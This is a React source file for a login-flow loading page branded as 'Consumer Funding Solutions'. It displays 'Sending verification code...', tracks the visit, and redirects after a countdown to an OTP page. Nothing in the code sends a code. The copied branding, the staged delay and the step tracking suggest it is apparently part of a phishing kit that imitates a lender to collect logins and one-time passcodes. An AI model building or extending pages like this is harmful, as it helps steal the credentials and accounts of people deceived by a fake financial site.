import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { trackActivity } from './tracker';
import Logo from './Logo';

const Loading = () => {
  const navigate = useNavigate();
  const [countdown, setCountdown] = useState(3); // NEW: Countdown state

  useEffect(() => {
    trackActivity("Loading Page Entered");

    // 1. Handle the 1-second interval for the visual countdown
    const timer = setInterval(() => {
      setCountdown((prev) => prev - 1);
    }, 1000);

    // 2. Handle the 3-second redirect
    const redirect = setTimeout(() => {
      navigate('/otp');
    }, 3000);

    // Cleanup timers if the user leaves the page early
    return () => {
      clearInterval(timer);
      clearTimeout(redirect);
    };
  }, [navigate]);

  return (
    <div style={styles.pageWrapper}>
      {/* Header */}
      <div style={styles.header}>
        <Logo />
        <div style={styles.loginText}>Login</div>
      </div>

      {/* Loading Section */}
      <div style={styles.loadingArea}>
        <div className="spinner"></div> 
        
        <p style={styles.textMain}>Sending verification code...</p>
        
        {/* NEW: Visual Countdown Display */}
        <div style={styles.countdownBox}>
          Redirecting in <span style={styles.seconds}>{countdown}</span> seconds
        </div>
        
        <p style={styles.textSub}>Please do not close your browser.</p>
      </div>

      {/* Footer */}
      <footer style={styles.footer}>
        <div style={styles.footerLinks}>
          <span>ABOUT US</span>
          <span>TERMS OF USE</span>
          <span>PRIVACY POLICY</span>
        </div>
        <p style={styles.footerCopyright}>
          Copyright © 2017 Consumer Funding Solutions. All Rights Reserved.
        </p>
        <p style={styles.footerSiteMap}>SITE MAP</p>
      </footer>
    </div>
  );
};

const styles = {
  pageWrapper: { width: '100%', minHeight: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: '#fff', fontFamily: 'Arial' },
  header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
  loginText: { color: '#888', fontSize: '22px' },
  
  loadingArea: { flex: 1, display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center', paddingBottom: '100px' },
  textMain: { fontSize: '20px', color: '#444', marginTop: '30px', fontWeight: 'bold' },
  
  // Countdown Styles
  countdownBox: { marginTop: '15px', fontSize: '16px', color: '#666', backgroundColor: '#f9f9f9', padding: '10px 20px', borderRadius: '20px', border: '1px solid #eee' },
  seconds: { fontWeight: 'bold', color: '#00a651', fontSize: '18px' },

  textSub: { fontSize: '14px', color: '#888', marginTop: '20px' },
  
  footer: { backgroundColor: '#f0f2f5', padding: '40px 10px', textAlign: 'center', fontSize: '12px', color: '#666' },
  footerLinks: { display: 'flex', justifyContent: 'center', gap: '20px', marginBottom: '15px', fontWeight: 'bold' },
  footerCopyright: { marginBottom: '5px' },
  footerSiteMap: { fontWeight: 'bold' }
};

export default Loading;